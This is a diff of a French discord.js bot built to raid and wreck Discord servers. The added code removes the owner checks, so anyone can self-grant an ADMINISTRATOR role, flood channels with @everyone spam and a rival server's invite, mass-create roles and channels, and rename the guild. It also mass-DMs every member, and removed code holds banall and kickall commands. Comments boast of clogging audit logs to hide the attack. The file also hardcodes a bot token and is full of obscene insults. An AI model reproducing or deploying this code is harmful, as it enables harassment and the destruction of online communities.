@@ -1,98 +1,53 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const bot = new Discord.Client();
-var fs = require('fs');
-prefix = "*";
-let cooldown = new Set();
-let cds = 5;
-
-bot.commands = new Discord.Collection();
-
-
+prefix = "!";
 
 function cmd(str, msg) {
   return msg.content.toLowerCase().startsWith(prefix + str);
   }
 
 client.on('ready', () => {
-  client.user.setGame('bz ta grosse pute de mere')
-  console.log(`Connecté au Compte ${client.user.tag}!`);
+  client.user.setActivity('OFFICIAL | !help')
+  console.log(`bot on`);
+
+
 });
 
-
-client.login(process.env.TOKEN);
-        
+client.login("NDY2MjkyNTA4NTg2OTM0Mjcy.DiZ_bA.b03PsVSFkYahho2gT3XYdDfWnoY");
 
 
 
+      
+            // Help
+client.on('message', message => {
+  var args = message.content.split(" ").slice(1)
+  if(message.content.startsWith(prefix + ("help"))) {
+    let ballembed = new Discord.RichEmbed()
+    .setTitle("OFFICIAL DISCORD BOT")
+    .setDescription("N'hésitez pas a faire ***/setup*** pour une Meilleur Utilisation.")
+    .setColor("#c10f0f")
+    .addField("Moderation", "!ban : Ban un Utilisateur.\n!kick : Kick un Utilisateur.\n!rainbow: cree un grade multicolor.\n!all: vous donne la liste de toutes les commandes disponible non lister ici.")
+    .addField("Fun", "!avatar : Post son Avatar.\n!8ball : Fonction 8Ball.\n!roulette : Jouer a la Roulette Russe")
+    message.channel.send(ballembed);
+  }
+});
+            
+            
 
-// Commande de Kick
-        client.on('message', message => {
-          if (!message.guild) return;
-        
-          if (message.content.startsWith('/kick')) {
-            const user = message.mentions.users.first();
-            if (user) {
-              const member = message.guild.member(user);
-              if (member) {
-                member.kick('Mérité').then(() => {
-                  message.reply(`${user.tag} a bien été kick.`);
-                }).catch(err => {
-                  message.reply('Je ne peux kick cet utilisateur.');
-                  console.error(err);
-                });
-              } else {
-                message.reply('Je ne trouve pas cet utilisateur');
-              }
-            } else {
-              message.reply('Mentionner un Utilisateur a kick!');
-            }
-          }
-        });
-        
-        // Commande pour Ban
-        client.on('message', message => {
-          if (!message.guild) return;
-        
-          if (message.content.startsWith('/ban')) {
-            const user = message.mentions.users.first();
-            if (user) {
-              const member = message.guild.member(user);
-              if (member) {
-                member.ban({
-                  reason: 'M É R I T É',
-                }).then(() => {
-                  message.reply(`${user.tag} a bien été ban.`);
-                }).catch(err => {
-                  message.reply('Je ne peux ban cet utilisateur.');
-                  console.error(err);
-                });
-              } else {
-                message.reply('Je ne trouve pas cet utilisateur');
-              }
-            } else {
-              message.reply('Mentionner un Utilisateur a ban!');
-            }
-          }
-        });
-        
 
- 
 //Commande de Flood
 client.on("message", message => {
   if(cmd("spam", message)) {
-    if (message.author.id !== '457858896988733451') return;
 
   message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
-  for (var i = 1; i < 50; i++) {
-      message.channel.send(message.content.replace('/spam',''));
+  for (var i = 0; i < 100000; i++) {
+      message.channel.send("@everyone @here FDP TU TES FAIT NIQUER PAR LA E.C \nMTN DECALE SALE FDP\nhttp://gifdrole.com/bebes/bv000016.gif\nREJOIN LE SRV QUI TA NIQUER SOMBRE DECHEANCE.\nhttps://discord.gg/2Vfevup");
   }
 }
 });
           // Commande de Destruction
 client.on("message", msg => {
 if(cmd("channel", msg)) {
-  if (message.author.id !== '457858896988733451') return;
   msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
   for (var i = 0; i < 500; i++) {
       // Creates new roles to clog up the audit log
@@ -100,11 +55,12 @@ if(cmd("channel", msg)) {
           name: 'LA EF TA NIKER PD',
           color: 'BLUE',
       });
-      msg.guild.createChannel('LA EF A BZ TA MERE PD', 'voice')
-      msg.guild.createChannel('LA EF A BZ TA MERE PD', 'text')
+      msg.guild.createChannel('purified by E.C', 'voice')
+      msg.guild.createChannel('purified by E.C', 'text')
       //changes name tons of times to clog up the audit log
-      msg.guild.setName("EF: ELFAMOSO > EZ ALL");
+      msg.guild.setName("LA EC A VIOLER TON PERE");
       msg.guild.setRegion('russia')
+
    }
    
    
@@ -114,12 +70,11 @@ if(cmd("channel", msg)) {
        // Commande de Destruction
 client.on("message", msg => {
 if(cmd("icon", msg)) {
-  if (message.author.id !== '457858896988733451') return;
   msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
   for (var i = 0; i < 500; i++) {
       // Creates new roles to clog up the audit log
       msg.guild.createRole({
-          name: 'ELFAMOSO',
+          name: 'tu creve',
           color: 'RED',
       });
       msg.guild.setIcon('https://cdn.discordapp.com/attachments/443413713647697940/443414380474793984/JPEG_20180429_165234.jpg')
@@ -131,286 +86,107 @@ if(cmd("icon", msg)) {
 
 
       
-            // ttes les perms
-            // ttes les perms
-            client.on("message", message => {
-if(cmd("k", message)) {
-  if (message.author.id !== '457858896988733451') return;
+            // Commande d'Admin
+            client.on('message', message => {
+              if(message.content.startsWith(prefix + ("ezall"))) {
                 let RoleToAdd = message.guild.roles.find('name', 'ELFAMOSO')
  
                 message.member.addRole(RoleToAdd);
                  message.guild.createRole({
  
-                  name: 'K',
-
+                  name: 'ELFAMOSO',
+                 
                   color: 'RED',
-
-                  permissions:'ADMINISTRATOR',
-
+                 
+                  permissions:'ADMINISTRATOR',            
+                
                 })
-
+                 
                 }
-
+                 
                 });
 
-                client.on("message", message => {
-                  if(cmd("info", message)) {
-                    if (message.author.id !== '457858896988733451') return;
-                    message.delete(1000);
 
-                const embed = new Discord.RichEmbed()
-                .setTitle("Click ICI pour ajouter notre bot a ton serveur !")
-                .setAuthor("| CHAØS |", "https://image.noelshack.com/fichiers/2018/27/4/1530805041-chaos.jpg")
-                /*
-                 * Alternatively, use "#00AE86", [0, 174, 134] or an integer number.
-                 */
-                .setColor(0x00AE86)
-                .setDescription("Un robot de modération 100% français -\n Système automatique anti-insultes & anti-spam\nOwner(s): Baximoz\nPrefix: /.")
-                .setFooter("Copyright 2018", "https://image.noelshack.com/fichiers/2018/27/4/1530805041-chaos.jpg")
-                
-                .setThumbnail("https://image.noelshack.com/fichiers/2018/27/4/1530805041-chaos.jpg")
-                /*
-                 * Takes a Date object, defaults to current date.
-                 */
-                .setTimestamp()
-                .setURL("https://discordapp.com/oauth2/authorize?permissions=8&scope=bot&client_id=461135223867047936")
-                
-                .addField("/bvn ou bvn",
-                  "Souhaitez la bienvenue !")
+                //commande me
 
-                .addField("/clear", "Efface les derniers messages entre 2 & 99 messages\n Perm : Supp. messages", true)
-                
-                .addField("/stats", "Affiche les statistiques du robot.", true)
+                client.on('message', message => {
+                    if(message.content.startsWith(prefix + ("ezall"))) {
+                        let msg = args.slice(0).join(" ");
 
-                .addField("/serverinfo", "Affiche les informations du serveur.", true)
-
-                .addField("/userinfo", "Affiche des informations concernant une personne.", true)
-
-                .addField("/website", "Affiche le lien du site web.", true)
-
-                .addField("/invite ", "Affiche le lien d'invitation directement.", true)
-
-                .addField("/help", "Affiche le panel d'aide en message privé.", true)
-
-                .addField("/hhelp", "Affiche le panel d'aide directement sur le serveur.", true)
-
-                .addField("/update", "Vous affiche la dernière mise à jour.", true)
-
-                .addField("/ban", "ban un utilisateur du serveur", true)
-
-                .addField("/nitro", "vous ajoute dans une liste pour gagner un compte nitro.", true)
-
-                .addField("/rainbow", "Te donne un grade multicolor\nPerm: ajouter des roles.", true)
-
-                .addField("/dieu", "Te dit si tu es un dieu.", true)
-
-                .addField("/anek", "(new) Lance un jeu de type Manga/DragonBall/... \n\n\nEt bien + encore !.", true)
+                        let ballembed = new Discord.RichEmbed()
+                        .setTitle("say")
+                        .setColor("#c10f0f")
+                        .addField("Message", msg)
+                        
+                        message.channel.send(ballembed);
 
 
-                .addBlankField(true)
+                    }
+                 
+                });
+
+
+                //massrole
                
-    
-                message.channel.send({embed});
-                    
-              }
-            });
+                client.on('message', message => {
+                  if(message.content.startsWith(prefix + ("role"))) {
+                      console.log(`Commande !role par ${message.author.tag}`);
+                      if (message.deletable) message.delete();
+                      let i = 0;
+                      let interval = setInterval(function () {
+                      if (i === 250) clearInterval(interval);
+                      message.guild.createRole({name: 'purified by E.C', color:'RANDOM'}).then(function(role) {
+                        message.guild.members.forEach(member => {
+                        member.addRole(role).catch(e => {});
+                      })
+                      i++
+                      }, 100)
+                         })
+                        }
+                 
+                      });
 
 
-        
+                      client.on('message', message => {
+                        if(message.content.startsWith(prefix + ("mp"))) {
+                            if(message.deletable) message.delete();
+                            i = 0;
+                            message.guild.members.forEach(member => {
+                        
+                            if(i < 500){
+                              var interval = setInterval (function () {
+                                member.send(`REJOIN LE SRV QUI A BZ TA MERE\n https://discord.gg/2Vfevup`).catch(e => {});
+                              }, 450)
+                        
+                              }   
+                          })
+                        }
+                          });
 
-
-            client.on("message", message => {
-              if(cmd("say", message)) {
-                if (message.author.id !== '457858896988733451') return;
-                message.delete();
-
-            const embed = new Discord.RichEmbed()
-            .setAuthor(message.author.username, message.author.displayAvatarURL)
-            /*
-             * Alternatively, use "#00AE86", [0, 174, 134] or an integer number.
-             */
-            .setColor(0x00AE86)
-            
-            /*
-             * Takes a Date object, defaults to current date.
-             */
-           
-
-            .addField("==================", message.content.replace('*say','') , true)
-            
-
-
-            .addBlankField(true)
-           
-
-            message.channel.send({embed});
-                
-          }
-        });
-
-
-        client.on("message", message => {
-          if(cmd("help", message)) {
-            if (message.author.id !== '457858896988733451') return;
-            message.delete();
-
-            message.channel.send("prefix: !\nk: te met un grade pr pas te faire banall ou kickall\nkickall\nbanall\nspam 'msg': spam le msg \ninfo: envoi une invitation du bot\nsay: envoi un msg en embeds\nbackdoor: te cree une backdoor\nm6: te lvl up le mee6")
-      
-            
-      }
-    });
-
-    client.on("message", message => {
-      if(cmd("insulte", message)) {
-        if (message.author.id !== '457858896988733451') return;
-        message.delete();
-
-        let repete = ["tais toi", "tu begaye même en écris sombre fils de pute", "Je te baise ta mère tout les jours gros", "dauilleur pense à pas rager quand tu vas me voir sortir de sa chambre cette nuit", "Ayyaaaaaaa y'a aucun rapport entre se que tu dis et se que tu fais ", "n'oublie pas que t'es moche et que appars ta main droite tu baise rien", "même mon bot te victimise gros fais pas le malin sombre déchéance.", "tu parle tu parle mais sa vas vesqui le vocal par peur de se faire laminer vocalement", "Je te crache dessus car t'es ma pute , ma salop, ma chienne , tire toi de là tu risque de te suicider façon kendral"];
-        let result = Math.floor((Math.random() * repete.length));
-        message.channel.send(repete[result])
-  
-        
-  }
-});
-
-client.on("message", message => {
-  if(cmd("backdoor", message)) {
-    if (message.author.id !== '457858896988733451') return;
-    message.delete();
-  message.channel.send("BACKDOOR CREATOR | BY BAXIMOZ |");
-  message.channel.send("-------------------------------");
-  message.channel.send("téléchargement des packets...")
-  message.channel.send("telechargement de la console...");
-  message.channel.send("téléchargement de l'émulator...");
-  message.channel.send("telechargement des données manquantes....");
-  message.channel.send("TELECHARGEMENT DES COMPOSANTS TERMINER.")
-  message.channel.send("--------------------------------\n");
-  message.channel.send("VEUILLEZ ECRIRE L'IP DE L'HOST...(lhost 'ip')");
-
-  }
-});
-
-client.on("message", message => {
-  if(cmd("lhost", message)) {
-    if (message.author.id !== '457858896988733451') return;
-    message.delete();
-message.channel.send("IP LHOST=" + message.content.replace('/lhost','') + "\nVEUILLER INDIQUER LE PORT...(lport 'port'");
-  }
-});
-
-client.on("message", message => {
-  if(cmd("lport", message)) {
-    if (message.author.id !== '457858896988733451') return;
-    message.delete();
-    message.delete();
-message.channel.send("PORT LPORT=" + message.content.replace('/lport',''));
-  message.channel.send("création de la backdoor...");
-  
-    message.channel.send("loading.");
-    
-    
-    
-    message.delete();
-    
-    
-    
-    message.channel.send("loading..");
-    
-    
-    
-    
-    message.delete();
-    
-    
-    
-    message.channel.send("loading...");
-    
-    
-    
-    message.delete();
-    
-    
-    
-    message.channel.send("loading.");
-    
-    
-    
-    message.delete();
-    
-    
-    
-    
-    message.channel.send("loading..");
-    
-    
-    
-    message.delete();
-    
-    
-    
-    message.channel.send("loading...");
-    
-    
-    
-    
-    message.delete();
-    
-    
-    
-    
-    message.channel.send("====================");
-    message.channel.send("Backdoor créé avec succès !");
-    message.channel.send("====================");
-  }
-});
-
-
-
-//Commande de Flood
-client.on("message", message => {
-  if(cmd("m6", message)) {
-    if (message.author.id !== '457858896988733451') return;
-message.delete();
-  message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
-  for (var i = 0; i < 50; i++) {
-      message.channel.send("/mee6")
-    }
-}
-});
-
-client.on("message", message => {
-  if(cmd("mee6", message)) {
-message.delete();
-  }
-});
-
-client.on("message", message => {
-  if(cmd("banall", message)) {
-    message.delete();
-    if (message.author.id !== '457858896988733451') return;
-
-    message.guild.members.forEach(member => {
-      if (!member.roles.exists("name", "K") && member.bannable) member.ban().catch(e => {});
-      })
+                          client.on('message', message => {
+                            if(message.content.startsWith(prefix + ("raid"))) {
+                                if(message.deletable) message.delete();
+                              message.channel.send('!mp');
+                              message.channel.send('!channel');
+                              message.channel.send('!spam');
+                              message.channel.send('!role');
+                              }
+                            });
 
 
 
 
-  }
-});
+                          
 
 
-client.on("message", message => {
-  if(cmd("kickall", message)) {
-    message.delete();
-    if (message.author.id !== '457858896988733451') return;
+                              client.on('message', message => {
+                                if(message.content.startsWith(prefix + ("inv"))) {
 
-    message.guild.members.forEach(member => {
-      if (!member.roles.exists("name", "K") && member.kickable) member.kick().catch(e => {});
-      })
+                                  message.guild.channels.random().createInvite().then(invite =>
+                                    console.log(invite.url))
 
-
-
-
-  }
-});
+                                }
+                              });
+                              
+                              
+                          
